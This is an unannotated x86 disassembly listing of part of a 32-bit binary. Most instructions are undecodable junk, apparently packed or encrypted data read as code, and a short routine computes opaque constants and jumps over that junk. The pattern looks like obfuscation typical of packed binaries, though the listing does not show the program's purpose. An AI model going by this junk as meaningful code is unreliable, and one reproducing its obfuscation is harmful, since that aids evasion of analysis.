  40a0c2:	ja     0x40a05e
  40a0c4:	test   eax,0xf00446cd
  40a0c9:	push   ss
  40a0ca:	into   
  40a0cb:	mov    dl,0xc6
  40a0cd:	adc    DWORD PTR [ebp*1-0x66efdd44],esi
  40a0d4:	inc    ebx
  40a0d5:	sub    eax,0xb2e8eb43
  40a0da:	xchg   esi,eax
  40a0db:	popf   
  40a0dc:	fwait
  40a0dd:	inc    ebx
  40a0de:	push   edi
  40a0df:	sbb    esp,esp
  40a0e1:	dec    esi
  40a0e2:	add    dl,BYTE PTR [edx]
  40a0e4:	fxch   st(1)
  40a0e6:	jl     0x40a115
  40a0e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0e9:	cdq    
  40a0ea:	push   es
  40a0eb:	cdq    
  40a0ec:	sub    edi,DWORD PTR [edx]
  40a0ee:	adc    DWORD PTR [ebx],0xb807fbaa
  40a0f4:	sub    al,bl
  40a0f6:	(bad)  
  40a0f7:	rol    BYTE PTR [edi],0x80
  40a0fa:	adc    DWORD PTR [esi+0x34],0x8
  40a0fe:	ret    
  40a0ff:	push   es
  40a100:	sahf   
  40a101:	ins    BYTE PTR es:[edi],dx
  40a102:	je     0x40a132
  40a104:	test   BYTE PTR [esi+0xe],0x5f
  40a108:	dec    ecx
  40a109:	mov    edx,0xffd6b6d7
  40a10e:	repz mov es,WORD PTR [eax+0x3a]
  40a112:	inc    ecx
  40a113:	push   ss
  40a114:	std    
  40a115:	xor    al,dh
  40a117:	ret    0xe5c9
  40a11a:	xchg   esi,eax
  40a11b:	shufps xmm0,XMMWORD PTR [esi+0x7ba6a98e],0x40
  40a123:	shl    DWORD PTR [edi+0x31],1
  40a126:	pop    edi
  40a127:	(bad)  
  40a128:	iret   
  40a129:	(bad)  
  40a12a:	dec    ecx
  40a12b:	or     ecx,ebp
  40a12d:	mov    esp,0xef0fa616
  40a132:	inc    edi
  40a133:	jg     0x40a115
  40a135:	pop    eax
  40a136:	(bad)  
  40a137:	fcom   QWORD PTR [edx+0x1a79d7ec]
  40a13d:	xor    dl,BYTE PTR [ebx-0x4f]
  40a140:	mov    eax,0xa6d0d15a
  40a145:	jbe    0x40a0f1
  40a147:	xor    edx,eax
  40a149:	fbstp  TBYTE PTR [edi-0x4b1cb57a]
  40a14f:	mov    esp,0x169e80ef
  40a154:	les    ecx,FWORD PTR [ebx+0xe]
  40a157:	test   BYTE PTR [ecx+0x1eb23f90],ch
  40a15d:	lahf   
  40a15e:	in     eax,dx
  40a15f:	inc    ecx
  40a160:	loope  0x40a183
  40a162:	add    DWORD PTR [esi],edi
  40a164:	mov    BYTE PTR [ecx],bh
  40a166:	lods   al,BYTE PTR ds:[esi]
  40a167:	ins    DWORD PTR es:[edi],dx
  40a168:	mov    dl,BYTE PTR [ebp-0x11]
  40a16b:	jecxz  0x40a1d5
  40a16d:	mov    eax,0xb7f1218e
  40a172:	lock mov BYTE PTR [edi],al
  40a175:	fnstcw WORD PTR [ebp+0x4a]
  40a178:	push   cx
  40a17a:	dec    edi
  40a17b:	int    0xdb
  40a17d:	push   ebx
  40a17e:	and    ebp,DWORD PTR [eax]
  40a180:	leave  
  40a181:	jle    0x40a1fb
  40a183:	or     al,0x31
  40a185:	leave  
  40a186:	out    0x8c,al
  40a188:	pop    ebx
  40a189:	test   BYTE PTR [eax+edi*2],ah
  40a18c:	out    dx,eax
  40a18d:	pop    eax
  40a18e:	mov    eax,0x35c22371
  40a193:	retf   
  40a194:	pop    eax
  40a195:	add    BYTE PTR [eax],al
  40a197:	sub    eax,0x14de
  40a19c:	cmp    ecx,eax
  40a19e:	jbe    0x409a9d
  40a1a4:	pop    edi
  40a1a5:	pop    esi
  40a1a6:	leave  
  40a1a7:	ret    0xc
  40a1aa:	push   ebp
  40a1ab:	mov    ebp,esp
  40a1ad:	sub    esp,0x9c
  40a1b3:	push   ebx
  40a1b4:	push   esi
  40a1b5:	push   edi
  40a1b6:	mov    DWORD PTR [ebp-0x8],0x527f
  40a1bd:	mov    DWORD PTR [ebp-0x4],0x285
  40a1c4:	mov    ecx,DWORD PTR ds:0x42262c
  40a1ca:	mov    eax,ds:0x422628
  40a1cf:	and    ecx,0x5000
  40a1d5:	or     eax,ecx
  40a1d7:	mov    ecx,DWORD PTR [ebp-0x4]
  40a1da:	mov    edx,DWORD PTR [ebp-0x8]
  40a1dd:	or     eax,0x4f
  40a1e0:	imul   ecx,edx
  40a1e3:	imul   ecx,eax
  40a1e6:	mov    eax,ds:0x4222a8
  40a1eb:	lea    eax,[ecx+eax*1+0x1f27be8b]
  40a1f2:	mov    DWORD PTR [ebp-0x30],eax
  40a1f5:	mov    DWORD PTR [ebp-0x8],0x4371
  40a1fc:	mov    eax,DWORD PTR [ebp-0x8]
  40a1ff:	mov    ecx,DWORD PTR ds:0x422634
  40a205:	shr    eax,1
  40a207:	and    eax,ecx
  40a209:	mov    ecx,DWORD PTR ds:0x422630
  40a20f:	and    eax,0x2140
  40a214:	xor    edx,edx
  40a216:	div    ecx
  40a218:	mov    ecx,DWORD PTR ds:0x4223dc
  40a21e:	xor    edx,edx
  40a220:	xor    eax,0x1080
  40a225:	lea    eax,[ebp+eax*1-0x28]
  40a229:	mov    DWORD PTR [eax],ecx
  40a22b:	mov    DWORD PTR [ebp-0x8],0x4762
  40a232:	mov    ecx,DWORD PTR ds:0x422640
  40a238:	mov    eax,ds:0x42263c
  40a23d:	jmp    0x40a5b4
  40a242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a243:	jmp    0x40a1fd
  40a245:	add    eax,0x6abd8dbd
  40a24a:	jl     0x40a24d
  40a24c:	scas   eax,DWORD PTR es:[edi]
  40a24d:	cmp    esi,edi
  40a24f:	(bad)
  40a252:	or     BYTE PTR [eax-0x3a994445],dl
  40a258:	mov    ebx,0xe7e663bb
  40a25d:	push   edx
  40a25e:	mov    eax,DWORD PTR [ebx+eiz*8-0x373c019a]
  40a265:	lods   eax,DWORD PTR ds:[esi]
  40a266:	cmp    BYTE PTR ss:[ecx+0x6c0150b],0x64
  40a26e:	retf   
  40a26f:	inc    esi
  40a270:	push   esi
  40a271:	scas   al,BYTE PTR es:[edi]
  40a272:	sub    BYTE PTR [edx+0x4950ad4f],bl
  40a278:	jge    0x40a204
  40a27a:	enter  0x572b,0x86
  40a27e:	xor    al,0xa8
  40a280:	lahf   
  40a281:	and    ebp,DWORD PTR [edi]
  40a283:	sbb    eax,0xf083891c
  40a288:	adc    edi,ebx
  40a28a:	sbb    DWORD PTR [eax],ebx
  40a28c:	xor    DWORD PTR [esi],0xffffffb6
  40a28f:	inc    edx
  40a290:	int3   
  40a291:	mov    DWORD PTR [ebx-0x43],0xc1a5ac5a
  40a298:	shr    BYTE PTR [edx+0x5],0x35
  40a29c:	ss fs add edi,eax
  40a2a0:	push   esp
  40a2a1:	and    ebx,DWORD PTR [esi-0x29]
  40a2a4:	jg     0x40a22a
  40a2a6:	xor    DWORD PTR [esi-0x7e335371],edx
  40a2ac:	stos   BYTE PTR es:[edi],al
  40a2ad:	push   cs
  40a2ae:	push   esp
  40a2af:	mov    bp,0x44cb
  40a2b3:	or     ebp,edi
  40a2b5:	jmp    0x91ab510d
  40a2ba:	pop    ebp
  40a2bb:	and    ebx,edx
  40a2bd:	jmp    0x968a:0xb768a8b1
  40a2c4:	inc    edi
  40a2c5:	imul   ebp,ecx,0x89436018
  40a2cb:	stos   DWORD PTR es:[edi],eax
  40a2cc:	pop    edi
  40a2cd:	ins    DWORD PTR es:[edi],dx
  40a2ce:	mov    al,0xab
  40a2d0:	sbb    BYTE PTR ds:[edi],bl
  40a2d3:	sub    al,0x15
  40a2d5:	call   0xddf5f7d2
  40a2da:	jl     0x40a265
  40a2dc:	adc    al,0x91
  40a2de:	add    eax,0x4bf7885
  40a2e3:	adc    BYTE PTR [ebp-0x59b3e980],ah
  40a2e9:	imul   edi,DWORD PTR ds:0x30a02073,0xdc3eddfe
  40a2f3:	fs push ds
  40a2f5:	aas    
  40a2f6:	xchg   esi,eax
  40a2f7:	xchg   edi,eax
  40a2f8:	leave  
  40a2f9:	or     al,0x5a
  40a2fb:	ret    0x584a
  40a2fe:	pop    ebx
  40a2ff:	mov    esp,0xf4991568
  40a304:	mov    ebp,0x1adb5572
  40a309:	xchg   ebx,eax
  40a30a:	jbe    0x40a37f
  40a30c:	retf   
  40a30d:	clc    
  40a30e:	inc    sp
  40a310:	icebp  
  40a311:	in     eax,0xbd
  40a313:	addr16 xchg esp,eax
  40a315:	(bad)  
  40a316:	lahf   
  40a317:	xchg   ecx,eax
  40a318:	inc    edi
  40a319:	xchg   BYTE PTR [edi],cl
  40a31b:	mov    ebp,ebp
  40a31d:	cmp    BYTE PTR [ecx+0x1f61a559],al
  40a323:	lea    ecx,ds:0x8b925b72
  40a329:	cmc    
  40a32a:	cwde   
  40a32b:	push   edi
  40a32c:	pop    esi
  40a32d:	fimul  DWORD PTR [edi-0x3d]
  40a330:	call   0x3c8f:0x21b84b60
  40a337:	or     esp,DWORD PTR [ecx+0x57bd2e10]
  40a33d:	add    BYTE PTR [ecx+0x3a9217ad],bl
  40a343:	rcl    BYTE PTR [eax],0x5d
  40a346:	sub    eax,0x8421c708
  40a34b:	inc    esi
  40a34c:	cdq    
  40a34d:	jecxz  0x40a2fa
  40a34f:	cmc    
  40a350:	aas    
  40a351:	mov    dh,0x15
  40a353:	jle    0x40a3ac
  40a355:	dec    ebp
  40a356:	mov    ch,0x27
  40a358:	mov    ebp,DWORD PTR [ebx+ebx*2-0x3673bca1]
  40a35f:	call   DWORD PTR [ebp-0x4202cd71]
  40a365:	jns    0x40a3da
  40a367:	jbe    0x40a3bb
  40a369:	pop    ds
  40a36a:	cdq    
  40a36b:	in     eax,0xd6
  40a36d:	dec    esp
  40a36e:	ror    BYTE PTR [esi],cl
  40a370:	je     0x40a388
  40a372:	and    DWORD PTR [ebp*1+0x5429c535],ebx
  40a379:	cs (bad) 
  40a37b:	xchg   esp,eax
  40a37c:	adc    al,0xa5
  40a37e:	outs   dx,BYTE PTR ds:[esi]
  40a37f:	ins    DWORD PTR es:[edi],dx
  40a380:	or     esp,esp
  40a382:	pop    gs
  40a384:	cmp    dl,ch
  40a386:	push   ecx
  40a387:	mov    BYTE PTR [ecx+0x2b2eccdc],dl
  40a38d:	mov    BYTE PTR [di-0x2],ah
  40a391:	pop    ecx
  40a392:	sbb    esp,eax
  40a394:	push   ds
  40a395:	cmp    dl,BYTE PTR [edi-0x2afc2511]
  40a39b:	out    dx,al
  40a39c:	lods   eax,DWORD PTR ds:[esi]
  40a39d:	ret    
  40a39e:	mov    ds:0xce7cb3f8,al
  40a3a3:	jmp    0x40a412
  40a3a5:	mov    DWORD PTR [ebx+0x3539f565],ebp
  40a3ab:	fsub   st(2),st
  40a3ad:	mov    cl,0xf5
  40a3af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3b0:	mov    cs,WORD PTR [edx+0x754c0c32]
  40a3b6:	or     al,0xff
  40a3b8:	or     BYTE PTR [edx+0x17d1608c],cl
  40a3be:	dec    edx
  40a3bf:	and    edi,DWORD PTR [esi-0xffeebbf]
  40a3c5:	fcomi  st,st(3)
  40a3c7:	xor    al,0x36
  40a3c9:	pop    ss
  40a3ca:	jae    0x40a426
  40a3cc:	pusha  
  40a3cd:	out    0x6a,al
  40a3cf:	xor    eax,0xffffff9c
  40a3d2:	pop    ebp
  40a3d3:	pop    ebx
  40a3d4:	jmp    0x3a3:0x357a997b
  40a3db:	pop    esp
  40a3dc:	in     eax,0xc7
  40a3de:	jg     0x40a3c8
  40a3e0:	mov    WORD PTR [esi+0x11599c14],fs
  40a3e6:	mov    al,0xf7
  40a3e8:	retf   
  40a3e9:	or     ebx,DWORD PTR [eax-0x59a45461]
  40a3ef:	mov    ch,0x93
  40a3f1:	mov    dh,0x49
  40a3f3:	fistp  DWORD PTR [eax]
  40a3f5:	mov    DWORD PTR [edx-0x31558d63],ecx
  40a3fb:	mov    DWORD PTR [edi],ebx
  40a3fd:	sti    
  40a3fe:	jmp    0x40a392
  40a400:	jge    0x40a3e9
  40a402:	sbb    esi,DWORD PTR [ebp+0x35]
  40a405:	call   0xc227:0xe57e6c4c
  40a40c:	sub    DWORD PTR [ecx],0xfc18a3ae
  40a412:	inc    esp
  40a413:	pop    ebp
  40a414:	int3   
  40a415:	add    bl,BYTE PTR [eax+ebp*2]
  40a418:	loop   0x40a47b
  40a41a:	fst    DWORD PTR [esi+0x21]
  40a41d:	xchg   edx,eax
  40a41e:	loopne 0x40a483
  40a420:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a421:	mov    edx,0x24e2b00b
  40a426:	pop    ebx
  40a427:	or     eax,0xdbcc53e4
  40a42c:	imul   esi,DWORD PTR [esi+edi*4-0x55d8cefc],0x74
  40a434:	or     eax,0x5e7ac14c
  40a439:	add    BYTE PTR [edi+0x75],al
  40a43c:	call   0x4408:0xee74770e
  40a443:	xchg   ebx,eax
  40a444:	repz mov ebp,0x2f367a09
  40a44a:	sbb    al,0x9d
  40a44c:	inc    edx
  40a44d:	fbld   TBYTE PTR [edi-0x15e6d1ee]
  40a453:	stos   DWORD PTR es:[edi],eax
  40a454:	push   eax
  40a455:	and    eax,0xa5ea4f0d
  40a45a:	daa    
  40a45b:	sar    DWORD PTR [esi],1
  40a45d:	push   edx
  40a45e:	dec    ebx
  40a45f:	mov    eax,ds:0xd83d745b
  40a464:	fiadd  DWORD PTR [ebp+ecx*8+0x59]
  40a468:	pop    esp
  40a469:	mov    edx,DWORD PTR ds:0x137fee86
  40a46f:	(bad)  
  40a470:	retf   
  40a471:	out    dx,al
  40a472:	mov    eax,0x11f71bb6
  40a477:	icebp  
  40a478:	mov    esp,0x3bf358cb
  40a47d:	aaa    
  40a47e:	mov    ebp,0x57c84bd8
  40a483:	stc    
  40a484:	xchg   esp,eax
  40a485:	lahf   
  40a486:	inc    edi
  40a487:	adc    ecx,edi
  40a489:	pusha  
  40a48a:	sbb    BYTE PTR [ebx],ch
  40a48c:	xchg   edi,eax
  40a48d:	cdq    
  40a48e:	push   0x127f914c
  40a493:	cmp    eax,0x514cf07b
  40a498:	pop    esp
  40a499:	in     eax,0x16
  40a49b:	jbe    0x40a508
  40a49d:	or     esi,DWORD PTR [edi+0xd]
  40a4a0:	xchg   ebx,eax
  40a4a1:	jns    0x40a4af
  40a4a3:	psubw  mm3,mm7
  40a4a6:	ins    DWORD PTR es:[edi],dx
  40a4a7:	ja     0x40a523
  40a4a9:	sub    dh,al
  40a4ab:	and    eax,0x5a77cb7d
  40a4b0:	inc    eax
  40a4b1:	std    
  40a4b2:	mov    ds:0x5e6854fc,eax
  40a4b7:	call   0x6b3d:0xe6da8ec3
  40a4be:	jmp    0x40a473
  40a4c0:	nop
  40a4c1:	cmp    bl,BYTE PTR [ebp+0x7f]
  40a4c4:	jmp    0x40a4f2
  40a4c6:	pop    edi
  40a4c7:	les    edi,FWORD PTR [ecx]
  40a4c9:	dec    esi
  40a4ca:	push   ss
  40a4cb:	push   edx
  40a4cc:	(bad)  [esi+0x3e]
  40a4cf:	leave  
  40a4d0:	add    al,0xc4
  40a4d2:	dec    esi
  40a4d3:	outs   dx,DWORD PTR ds:[esi]
  40a4d4:	xchg   edx,eax
  40a4d5:	mov    ch,0x20
  40a4d7:	inc    eax
  40a4d8:	rcl    DWORD PTR [ebp+0x2c1b2a2],0x4c
  40a4df:	stos   DWORD PTR es:[edi],eax
  40a4e0:	push   0xffffff89
  40a4e2:	pop    ss
  40a4e3:	cmp    ch,BYTE PTR ds:0x2170
  40a4e8:	inc    eax
  40a4e9:	push   edx
  40a4ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4eb:	stos   BYTE PTR es:[edi],al
  40a4ec:	and    ch,BYTE PTR [ecx+0x45]
  40a4ef:	into   
  40a4f0:	fstp   TBYTE PTR [esi-0x59]
  40a4f3:	ret    0xe990
  40a4f6:	mov    ebp,DWORD PTR [ecx]
  40a4f8:	gs or  esi,eax
  40a4fb:	outs   dx,DWORD PTR ds:[esi]
  40a4fc:	call   0x21bf:0x5117f44e
  40a503:	out    0xc6,eax
  40a505:	add    DWORD PTR [ecx+0x666e1e83],edi
  40a50b:	cld    
  40a50c:	pusha  
  40a50d:	jmp    0x40a4a4
  40a50f:	std    
  40a510:	adc    DWORD PTR [esi],esp
  40a512:	rcl    BYTE PTR [esi],1
  40a514:	mov    BYTE PTR [esi+ebx*1+0x7ab74f3f],dl
  40a51b:	loop   0x40a552
  40a51d:	das    
  40a51e:	hlt    
  40a51f:	adc    ch,al
  40a521:	pop    esp
  40a522:	mov    esi,0x287af84b
  40a527:	fbstp  TBYTE PTR [edx]
  40a529:	aam    0xbf
  40a52b:	mov    ds:0x68d63cb9,al
  40a530:	push   es
  40a531:	pop    ecx
  40a532:	push   es
  40a533:	inc    BYTE PTR [esi-0x2135eb48]
  40a539:	outs   dx,DWORD PTR ds:[esi]
  40a53a:	xor    eax,0xfa521888
  40a53f:	mov    eax,ds:0xbae12998
  40a544:	lds    esi,FWORD PTR [ebx+eiz*1-0x2c]
  40a548:	jecxz  0x40a4e3
  40a54a:	jb     0x40a4fe
  40a54c:	out    0x5c,eax
  40a54e:	xor    ah,dh
  40a550:	push   ds
  40a551:	sub    BYTE PTR [edx-0x7d],0xcc
  40a555:	and    eax,0x9b8d90ca
  40a55a:	(bad)  [ebx-0x737d8da6]
  40a560:	test   al,0xeb
  40a562:	addr16 pop ecx
  40a564:	inc    ebx
  40a565:	pop    ds
  40a566:	jge    0x40a5a1
  40a568:	inc    di
  40a56a:	inc    ecx
  40a56b:	les    ebp,FWORD PTR [esi-0x62378496]
  40a571:	mov    cl,0x65
  40a573:	test   BYTE PTR [ebx-0x30df8082],al
  40a579:	fadd   DWORD PTR [edi]
  40a57b:	adc    al,0x48
  40a57d:	loopne 0x40a551
  40a57f:	daa    
  40a580:	enter  0x9681,0x5d
  40a584:	sar    DWORD PTR ss:[esi],1
  40a587:	mov    ?,WORD PTR [ebp-0x60]
  40a58a:	and    al,0xeb
  40a58c:	in     eax,dx
  40a58d:	(bad)  
  40a58e:	imul   DWORD PTR [ebp-0x499120df]
  40a594:	out    dx,eax
  40a595:	xchg   DWORD PTR [edi+0x6e],eax
  40a598:	adc    DWORD PTR [edx],edi
  40a59a:	lods   al,BYTE PTR ds:[esi]
  40a59b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a59c:	jae    0x40a5f5
  40a59e:	into   
  40a59f:	jb     0x40a5a1
  40a5a1:	test   eax,0x351cb258
  40a5a6:	test   BYTE PTR ds:0x212acea5,al
  40a5ac:	pop    ds
  40a5ad:	mov    ecx,0x63fd4e78
  40a5b2:	js     0x40a546
  40a5b4:	xor    ecx,eax
  40a5b6:	mov    eax,ds:0x422638
  40a5bb:	add    eax,ecx
  40a5bd:	mov    ecx,DWORD PTR [ebp-0x8]
  40a5c0:	xor    eax,0x5a4c
  40a5c5:	and    ecx,eax
  40a5c7:	sub    ecx,0x1422
  40a5cd:	mov    DWORD PTR [ebp-0x44],ecx
  40a5d0:	mov    eax,ds:0x422648
  40a5d5:	mov    ecx,DWORD PTR ds:0x422644
  40a5db:	xor    eax,ecx
  40a5dd:	shr    eax,1
  40a5df:	and    eax,0x4f6
  40a5e4:	add    eax,0x7f1a
  40a5e9:	mov    DWORD PTR [ebp-0x1c],eax
  40a5ec:	mov    eax,ds:0x422654
  40a5f1:	mov    ecx,DWORD PTR ds:0x422650
  40a5f7:	imul   eax,ecx
  40a5fa:	mov    ecx,DWORD PTR ds:0x42264c
  40a600:	sub    eax,ecx
  40a602:	and    eax,0xffffe611
  40a607:	imul   eax,eax,0xffffe30a
  40a60d:	and    eax,0x2d49
  40a612:	sub    eax,0xc8
  40a617:	mov    DWORD PTR [ebp-0x34],eax
  40a61a:	mov    DWORD PTR [ebp-0x4],0x7938
  40a621:	mov    DWORD PTR [ebp-0x8],0x3f2e
  40a628:	jmp    0x40a99f
  40a62d:	jne    0x40a617
  40a62f:	arpl   ax,ax
  40a631:	ja     0x40a674
  40a633:	jge    0x40a6b2
  40a635:	in     al,dx
  40a636:	daa    
  40a637:	cmc    
  40a638:	cmp    esi,DWORD PTR [ecx-0x22]
  40a63b:	aas    
  40a63c:	jno    0x40a5f2
  40a63e:	xchg   edx,eax
  40a63f:	mov    ebx,0xbbc566bb
  40a644:	mov    ebx,0x41d36551
  40a649:	add    dl,ah
  40a64b:	arpl   WORD PTR ds:[ecx+0x3e],si
  40a64f:	imul   ecx,DWORD PTR [edx+0x13e823ca],0xd95f5146
  40a659:	cdq    
  40a65a:	daa    
  40a65b:	adc    al,0x7d
  40a65d:	xchg   edi,eax
  40a65e:	inc    edi
  40a65f:	xor    al,0xcd
  40a661:	lds    esi,FWORD PTR [ebx-0x24]
  40a664:	mov    ch,0xc9
  40a666:	push   esp
  40a667:	or     eax,0x27869cbe
  40a66c:	jmp    0x92d7a98b
  40a671:	stos   BYTE PTR es:[edi],al
  40a672:	pop    esi
  40a673:	pop    ecx
  40a674:	sahf   
  40a675:	xchg   esi,eax
  40a676:	aas    
  40a677:	push   0xd364c922
  40a67c:	(bad)  
  40a67d:	(bad)  
  40a67e:	mov    ds:0x2df31334,al
  40a683:	xchg   edi,eax
  40a684:	mov    al,0x16
  40a686:	bound  edx,QWORD PTR [edx+ebx*1+0x5250ca41]
  40a68d:	rcl    BYTE PTR [edx+esi*1-0x4e],1
  40a691:	sub    dl,al
  40a693:	add    ah,BYTE PTR [eax]
  40a695:	mov    bl,0xe1
  40a697:	pop    ecx
  40a698:	xor    bh,bl
  40a69a:	loope  0x40a70d
  40a69c:	arpl   cx,si
  40a69e:	xor    ebp,DWORD PTR ds:0x9a8ead76
  40a6a4:	pop    edi
  40a6a5:	xlat   BYTE PTR ds:[ebx]
  40a6a6:	out    dx,eax
  40a6a7:	push   esp
  40a6a8:	xor    BYTE PTR [esi-0x6c22c89f],0x2d
  40a6af:	adc    al,al
  40a6b1:	add    BYTE PTR [esi-0x78d72790],0x33
  40a6b8:	idiv   DWORD PTR [ebx]
  40a6ba:	and    ah,BYTE PTR [ecx+edi*2-0x26]
  40a6be:	outs   dx,DWORD PTR ds:[esi]
  40a6bf:	rcr    DWORD PTR ds:0xa6bfd2f,1
  40a6c5:	(bad)  [edx]
  40a6c7:	add    eax,0xdedd971a
  40a6cc:	fistp  QWORD PTR [esi+0x48]
  40a6cf:	repz mov ah,0x75
  40a6d2:	add    edx,DWORD PTR [edi+0x557f05ad]
  40a6d8:	inc    edx
  40a6d9:	sbb    DWORD PTR [esi-0x40],edx
  40a6dc:	jae    0x40a672
  40a6de:	jo     0x40a719
  40a6e0:	ss loopne 0x40a6e3
  40a6e3:	jno    0x40a666
  40a6e5:	mov    edx,0x2be4e5f
  40a6ea:	les    esp,FWORD PTR [ebp+0x22e6ed92]
  40a6f0:	pop    esi
  40a6f1:	adc    ah,ah
  40a6f3:	lahf   
  40a6f4:	fnstsw WORD PTR [ebx]
  40a6f6:	pop    ds
  40a6f7:	add    esi,DWORD PTR [ecx]
  40a6f9:	(bad)  
  40a6fa:	lahf   
  40a6fb:	adc    dh,BYTE PTR [eax-0x4ca09b41]
  40a701:	ror    ebp,cl
  40a703:	aad    0x81
  40a705:	ss loop 0x40a722
  40a708:	mov    DWORD PTR [ebx-0x65],ebx
  40a70b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a70c:	and    eax,0xccce0792
  40a711:	jmp    0x40a6f1
  40a713:	inc    esi
  40a714:	xlat   BYTE PTR ds:[ebx]
  40a715:	push   ds
  40a716:	cld    
  40a717:	jp     0x40a78f
  40a719:	loop   0x40a738
  40a71b:	xchg   edi,eax
  40a71c:	loope  0x40a6eb
  40a71e:	fs mov bl,0x9c
  40a721:	xchg   edx,eax
  40a722:	inc    edi
  40a723:	sbb    al,0x88
  40a725:	mov    esp,0x4d25de79
  40a72a:	repnz loopne 0x40a6cc
  40a72d:	std    
  40a72e:	retf   0x460
  40a731:	outs   dx,BYTE PTR ds:[esi]
  40a732:	loop   0x40a730
  40a734:	mov    WORD PTR [ebx-0x19],?
  40a737:	sbb    DWORD PTR [ebx-0x7f58aa78],0xfcc5047
  40a741:	shl    DWORD PTR [edx],1
  40a743:	popf   
  40a744:	pop    edi
  40a745:	xchg   ebx,eax
  40a746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a747:	mov    ds:0x8e82337d,al
  40a74c:	inc    ebx
  40a74d:	mov    ebx,fs
  40a74f:	jmp    0x40a77a
  40a751:	fs std 
  40a753:	scas   al,BYTE PTR es:[edi]
  40a754:	mov    DWORD PTR [edx+eiz*4+0x3a],esp
  40a758:	hlt    
  40a759:	xchg   ebx,eax
  40a75a:	pop    ss
  40a75b:	pop    ebx
  40a75c:	xor    esi,DWORD PTR [eax-0x40112edd]
  40a762:	mov    dh,0x17
  40a764:	xchg   esi,eax
  40a765:	test   eax,0xe2cbc86
  40a76a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a76b:	lods   al,BYTE PTR ds:[esi]
  40a76c:	retf   0xe415
  40a76f:	xor    DWORD PTR [edi+0x70d54a2a],edx
  40a775:	xchg   ebx,eax
  40a776:	and    cl,ah
  40a778:	loop   0x40a728
  40a77a:	retf   
  40a77b:	adc    eax,0x1d57851b
  40a780:	xor    DWORD PTR [edi+0x1d8de03],esp
  40a786:	cmp    edx,DWORD PTR [edi+0x10]
  40a789:	cs stc 
  40a78b:	into   
  40a78c:	ret    0xaff7
  40a78f:	(bad)  [ebp-0x5473224e]
  40a795:	pop    ds
  40a796:	lods   eax,DWORD PTR ds:[esi]
  40a797:	mov    ch,0xa1
  40a799:	out    0xb9,al
  40a79b:	fadd   QWORD PTR [ebp+0x1b]
  40a79e:	mov    BYTE PTR [esi+0x3b],0x64
  40a7a2:	fs test al,0xac
  40a7a5:	xchg   edx,eax
  40a7a6:	out    dx,eax
  40a7a7:	xchg   DWORD PTR ds:0xc8345f5c,esp
  40a7ad:	mov    ds:0x6e9912dc,eax
  40a7b2:	retf   
  40a7b3:	call   0xe17:0xe61cfce4
  40a7ba:	mov    bh,0x88
  40a7bc:	test   al,0x16
  40a7be:	imul   ebp,eax,0x76
  40a7c1:	shl    DWORD PTR [eax+0x57],1
  40a7c4:	fcom   st(1)
  40a7c6:	pusha  
  40a7c7:	and    ah,BYTE PTR [edx]
  40a7c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7ca:	imul   ecx,ebx,0x6c
  40a7cd:	jbe    0x40a791
  40a7cf:	ss jp  0x40a77e
  40a7d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7d3:	xchg   esi,eax
  40a7d4:	popa   
  40a7d5:	ins    BYTE PTR es:[edi],dx
  40a7d6:	push   esp
  40a7d7:	iret   
  40a7d8:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7da:	lods   eax,DWORD PTR ds:[esi]
  40a7db:	dec    ecx
  40a7dc:	pop    esi
  40a7dd:	frstor [ecx-0x423a89e3]
  40a7e3:	pop    eax
  40a7e4:	mov    cl,0xe
  40a7e6:	xor    DWORD PTR [esp+eax*8+0x52],edx
  40a7ea:	mov    ds:0xd262c45c,al
  40a7ef:	std    
  40a7f0:	and    DWORD PTR [edx],0x8210d6fb
  40a7f6:	inc    ebx
  40a7f7:	cmc    
  40a7f8:	ins    BYTE PTR es:[edi],dx
  40a7f9:	(bad)  [edx-0x24]
  40a7fc:	pop    esp
  40a7fd:	xchg   ecx,eax
  40a7fe:	enter  0xffb7,0x48
  40a802:	add    dl,BYTE PTR [eax-0x5a]
  40a805:	or     BYTE PTR [ebx+0x5a],dh
  40a808:	cmp    eax,0x8020c1cd
  40a80d:	xchg   BYTE PTR [ebp-0x16],al
  40a810:	pushf  
  40a811:	int    0x14
  40a813:	mov    DWORD PTR [edx+0x3],ecx
  40a816:	cli    
  40a817:	cwde   
  40a818:	mov    bh,ch
  40a81a:	fistp  WORD PTR [edx]
  40a81c:	outs   dx,DWORD PTR ds:[esi]
  40a81d:	add    esp,DWORD PTR [ebx-0x22]
  40a820:	mov    bh,0x77
  40a822:	ins    BYTE PTR es:[edi],dx
  40a823:	sub    al,0x76
  40a825:	in     al,0x2c
  40a827:	mul    esi
  40a829:	aad    0x4f
  40a82b:	jge    0x20d8aaf7
  40a831:	icebp  
  40a832:	call   0x4fc1030d
  40a837:	mov    eax,ds
  40a839:	xchg   ebx,eax
  40a83a:	lea    edi,[eax-0x71]
  40a83d:	pop    ss
  40a83e:	imul   edx,esi,0xfe5d35a0
  40a844:	into   
  40a845:	lea    ebx,[ebx]
  40a847:	push   ebx
  40a848:	popa   
  40a849:	xchg   ebx,eax
  40a84a:	jnp    0x40a851
  40a84c:	cmp    bh,ah
  40a84e:	mov    edx,0x324f4adf
  40a853:	push   ebx
  40a854:	mov    al,ds:0x4dfb5f4
  40a859:	push   eax
  40a85a:	inc    edx
  40a85b:	leave  
  40a85c:	(bad)  
  40a85d:	(bad)
  40a861:	jno    0x40a8c6
  40a863:	jae    0x40a888
  40a865:	fisub  WORD PTR [esi+0x516cf4c8]
  40a86b:	add    BYTE PTR [edx+esi*2],dl
  40a86e:	xor    DWORD PTR [edx-0x47],0x1b26a9b2
  40a875:	jmp    0x40a8d2
  40a877:	mov    esi,0x549a8f95
  40a87c:	fdivr  DWORD PTR fs:[edx]
  40a87f:	jp     0x40a878
  40a881:	adc    BYTE PTR [edi-0x7fa65615],al
  40a887:	(bad)  
  40a888:	jmp    0x6f78:0xad42d9cc
  40a88f:	retf   0xbc0
  40a892:	dec    esp
